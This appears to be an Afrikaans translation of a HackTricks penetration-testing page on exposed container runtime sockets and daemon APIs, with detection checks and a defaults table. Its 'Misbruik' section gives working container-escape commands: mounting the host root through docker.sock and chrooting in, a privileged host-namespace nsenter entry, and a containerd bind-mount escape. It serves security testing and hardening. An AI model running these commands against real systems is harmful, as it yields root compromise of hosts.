# Runtime API en Daemon-blootstelling

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Baie werklike container-kompromitte begin glad nie met 'n namespace-ontsnapping nie. Hulle begin met toegang tot die runtime-beheervlak. As 'n workload met `dockerd`, `containerd`, CRI-O, Podman, of kubelet kan praat deur 'n gemonteerde Unix-sok of 'n blootgestelde TCP-luisteraar, kan die aanvaller moontlik 'n nuwe container versoek met beter voorregte, die host-lêerstelsel mount, host-namespaces aansluit, of sensitiewe node-inligting onttrek. In daardie gevalle is die runtime API die werklike sekuriteitsgrens, en dit kompromiteer dit funksioneel naby aan die kompromittering van die host.

Dit is hoekom runtime-sokblootstelling apart gedokumenteer moet word van kernel-beskerming. 'n Container met gewone seccomp, capabilities, en MAC confinement kan steeds net een API-aanroep ver van 'n host-kompromie wees as `/var/run/docker.sock` of `/run/containerd/containerd.sock` daarin gemonteer is. Die kernel-isolasie van die huidige container kan presies werk soos ontwerp, terwyl die runtime-bestuursvlak steeds ten volle blootgestel bly.

## Daemon-toegangsmodelle

Die Docker Engine openbaar tradisioneel sy bevoorregte API deur die plaaslike Unix-sok by `unix:///var/run/docker.sock`. Histories is dit ook blootgestel op afstand deur TCP-luisteraars soos `tcp://0.0.0.0:2375` of 'n TLS-beskermde luisteraar op `2376`. Om die daemon op afstand bloot te stel sonder sterk TLS en kliëntverifikasie maak die Docker API effektief 'n remote root-koppelvlak.

containerd, CRI-O, Podman, en kubelet openbaar soortgelyke hoë-impak-oppervlakke. Die name en workflows verskil, maar die logika nie. As die koppelvlak die oproeper toelaat om workloads te skep, host-paaie te mount, credentials te onttrek, of lopende containers te verander, is die koppelvlak 'n bevoorregte bestuurskanaal en moet dit dienooreenkomstig behandel word.

Algemene plaaslike paaie wat die moeite werd is om na te kyk, is:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ouer of meer gespesialiseerde stacks kan ook eindpunte blootstel soos `dockershim.sock`, `frakti.sock`, of `rktlet.sock`. Dit is minder algemeen in moderne omgewings, maar wanneer dit teëgekom word moet dit met dieselfde omsigtigheid behandel word omdat hulle runtime-beheeroppervlakke verteenwoordig eerder as gewone toepassingsokette.

## Veilige Afstandtoegang

As 'n daemon buite die plaaslike sok blootgestel moet word, moet die verbinding met TLS beskerm word en by voorkeur met wederkerige verifikasie sodat die daemon die kliënt verifieer en die kliënt die daemon verifieer. Die ou gewoonte om die Docker daemon op gewone HTTP te open vir gerief is een van die gevaarlikste foute in container-administrasie omdat die API-oppervlak sterk genoeg is om regstreeks bevoorregte containers te skep.

Die historiese Docker-konfigurasiepatroon het soos volg gelyk:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Op systemd-gebaseerde gashere kan daemon-kommunikasie ook verskyn as `fd://`, wat beteken dat die proses 'n vooraf oop socket van systemd erf in plaas daarvan om self direk te bind. Die belangrike les is nie die presiese sintaksis nie, maar die sekuriteitsgevolg. Sodra die daemon verder luister as 'n streng beperkte plaaslike socket, word transport security en client authentication verpligtend in plaas van opsionele verharding.

## Misbruik

As 'n runtime socket teenwoordig is, bevestig watter een dit is, of 'n kompatibele client bestaan, en of rou HTTP of gRPC toegang moontlik is:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle onderskei tussen 'n dooie pad, 'n gemonteerde maar onbereikbare socket, en 'n lewende bevoorregte API. As die kliënt slaag, is die volgende vraag of die API 'n nuwe container kan loods met 'n host bind mount of host namespace sharing.

### Volledige voorbeeld: Docker Socket To Host Root

As `docker.sock` bereikbaar is, is die klassieke ontsnapping om 'n nuwe container te begin wat die host root filesystem mount en dan `chroot` daarin uit te voer:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dit bied direkte host-root-uitvoering deur die Docker daemon. Die impak beperk hom nie net tot lêerlesings nie. Sodra 'n aanvaller binne die nuwe container is, kan hy lêers op die host verander, credentials oes, persistence implanteer, of addisionele privileged workloads begin.

### Volledige voorbeeld: Docker Socket To Host Namespaces

As die aanvaller voorkeur gee aan namespace entry in plaas van slegs filesystem-toegang:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Hierdie pad bereik die host deur die runtime te vra om 'n nuwe container te skep met eksplisiete host-namespace blootstelling, eerder as deur die huidige een uit te buit.

### Volledige voorbeeld: containerd Socket

'n gemonteerde `containerd` socket is gewoonlik net so gevaarlik:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Die impak is weer kompromittering van die gasheer. Selfs al is Docker-specific tooling afwesig, kan 'n ander runtime API steeds dieselfde administratiewe mag bied.

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die container enige management plane kan bereik wat buite die vertrouensgrens moes gebly het.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Wat hier interessant is:

- 'n gemounte runtime socket is gewoonlik 'n direkte administratiewe primitief eerder as bloot 'n inligtingsvrystelling.
- 'n TCP-lyster op `2375` sonder TLS moet as 'n remote-compromise toestand beskou word.
- Omgewingsveranderlikes soos `DOCKER_HOST` openbaar dikwels dat die workload opsetlik ontwerp is om met die host runtime te kommunikeer.

## Runtime-standaarde

| Runtime / platform | Standaardtoestand | Standaardgedrag | Algemene handmatige verzwakking |
| --- | --- | --- | --- |
| Docker Engine | Plaaslike Unix-sok per verstek | `dockerd` luister op die plaaslike sok en die daemon is gewoonlik rootful | montering van `/var/run/docker.sock`, blootstelling van `tcp://...:2375`, swak of ontbrekende TLS op `2376` |
| Podman | Daemonless CLI per verstek | Geen langlewende bevoorregte daemon is nodig vir gewone plaaslike gebruik nie; API-sokke kan steeds blootgestel word wanneer `podman system service` geaktiveer is | blootstelling van `podman.sock`, die diens algemeen bedryf, rootful API-gebruik |
| containerd | Plaaslike bevoorregte sok | Administratiewe API blootgestel via die plaaslike sok en gewoonlik deur hoërvlak-gereedskap verbruik | montering van `containerd.sock`, breë `ctr` of `nerdctl` toegang, blootstelling van bevoorregte namespaces |
| CRI-O | Plaaslike bevoorregte sok | CRI-endpunt is bedoel vir node-lokale betroubare komponente | montering van `crio.sock`, blootstelling van die CRI-endpunt aan onbetroubare workloads |
| Kubernetes kubelet | Node-lokale bestuur-API | Kubelet behoort nie wyd bereikbaar te wees vanaf Pods nie; toegang kan pod-status, credentials, en uitvoeringseienskappe blootstel, afhangend van authn/authz | montering van kubelet-sokke of sertifikate, swak kubelet-auth, host networking plus 'n bereikbare kubelet-endpunt |
{{#include ../../../banners/hacktricks-training.md}}
